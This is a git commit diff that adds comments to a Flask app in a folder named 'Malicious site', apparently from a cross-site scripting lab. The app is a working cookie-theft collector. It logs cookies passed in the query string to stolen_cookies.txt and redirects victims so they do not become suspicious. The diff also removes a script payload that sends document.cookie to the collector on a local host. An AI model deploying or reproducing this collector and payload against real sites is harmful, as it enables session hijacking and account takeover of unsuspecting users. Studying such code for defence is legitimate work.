dfab6765a003730d15badecab89c75547c68f699
Junhua <wenjh1998@gmail.com>
2020-12-18 18:23:49 +0800

    Add comments for code

--- Malicious site/app.py
+++ Malicious site/app.py
@@ -5,13 +5,18 @@ app = Flask(__name__)
 
 @app.route('/')
 def cookie():
+
+    #Get the c argument
     cookie = request.args.get('c')
+
+    #Write the cookie value to a file
     with open('stolen_cookies.txt', "a") as file:
         file.write(f"{datetime.now()}: {cookie}\n")
 
+    #Redirect the users back to the original page to remove suspicion
     return redirect("http://localhost:5000")
 
-#<script type=“text/javascript”>document.location=“http://127.0.0.1:1000/?c=“+document.cookie;</script>
 
+#Run the application at a different port
 if __name__ == '__main__':
     app.run(port=1000)
